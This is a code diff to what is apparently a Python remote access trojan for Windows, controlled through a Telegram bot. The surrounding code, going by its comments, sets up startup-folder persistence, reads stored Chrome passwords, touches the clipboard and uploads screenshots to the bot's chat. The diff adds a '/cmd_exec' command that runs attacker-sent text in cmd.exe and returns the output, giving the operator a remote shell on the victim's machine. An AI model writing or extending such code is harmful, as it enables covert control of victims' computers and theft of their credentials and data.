@@ -7,7 +7,8 @@ from json import loads 									# reading json from ipinfo.io
 from winshell import startup 							# persistence
 from tendo import singleton								# this makes the application exit if there's another instance already running
 from win32com.client import Dispatch					# WScript.Shell
-from time import strftime, sleep					
+from time import strftime, sleep
+from subprocess import Popen, PIPE						# /cmd_exec					
 import psutil											# updating	
 import win32clipboard                                   # register clipboard    
 import sqlite3											# get chrome passwords
@@ -218,6 +219,17 @@ def handle(msg):
 				bot.sendChatAction(chat_id, 'upload_photo')
 				bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
 				os.remove('screenshot.jpg')
+			elif command.startswith('/cmd_exec'):
+				process = Popen(['cmd'], stdin=PIPE, stdout=PIPE)
+				command = command.replace('/cmd_exec', '')
+				if len(command) > 1:
+					process.stdin.write(bytes(command + '\n'))
+					process.stdin.close()
+					lines = process.stdout.readlines()
+					for l in lines:
+						response += l
+				else:
+					response = '/cmd_exec dir'
 			elif command.startswith('/cd'):
 				command = command.replace('/cd ','')
 				try:
@@ -549,6 +561,7 @@ def handle(msg):
 				# functionalities dictionary: command:arguments
 				functionalities = { '/arp' : '', \
 						'/capture_pc' : '', \
+						'/cmd_exec' : '<command_chain>', \
 						'/cd':'<target_dir>', \
 						'/decode_all':'', \
 						'/delete':'<target_file>', \
